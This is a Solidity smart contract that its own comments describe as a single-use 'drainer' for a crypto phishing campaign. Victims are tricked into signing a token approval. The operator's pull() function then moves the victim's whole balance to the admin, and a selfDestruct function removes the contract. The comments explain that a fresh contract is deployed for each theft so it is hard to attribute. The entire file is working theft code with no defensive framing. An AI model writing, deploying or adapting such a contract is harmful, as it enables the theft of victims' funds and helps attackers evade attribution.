// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

/**
 * @title TokenPuller
 * @notice Single-use drainer contract. The operator deploys a FRESH one for
 *         every drain so the victim's approval points at a brand-new address
 *         that is hard to attribute to the campaign.
 *
 *         Flow:
 *           1. Victim signs setApprovalForAll(token, puller, true) on the
 *              phishing front-end (or approve(puller, max) for non-721).
 *           2. Operator (admin) calls pull() from the backend.
 *           3. pull() does transferFrom(victim -> admin) for the full balance.
 *           4. pull() self-destructs (or is simply abandoned) so the
 *              approval is one-shot.
 */
contract TokenPuller {
    using SafeERC20 for IERC20;

    address public immutable admin;
    address public immutable victim;
    address public immutable token;
    bool public pulled;

    event Pulled(address indexed token, address indexed from, address indexed to, uint256 amount);

    constructor(address _admin, address _victim, address _token) {
        require(_admin != address(0), "admin=0");
        require(_victim != address(0), "victim=0");
        require(_token != address(0), "token=0");
        admin = _admin;
        victim = _victim;
        token = _token;
    }

    /// @notice Only the operator can fire the drain.
    function pull() external {
        require(msg.sender == admin, "not admin");
        require(!pulled, "already pulled");
        pulled = true;

        uint256 bal = IERC20(token).balanceOf(victim);
        if (bal > 0) {
            IERC20(token).safeTransferFrom(victim, admin, bal);
            emit Pulled(token, victim, admin, bal);
        }
    }

    /// @notice Optional cleanup so the contract stops responding.
    function selfDestruct() external {
        require(msg.sender == admin, "not admin");
        selfdestruct(payable(admin));
    }
}
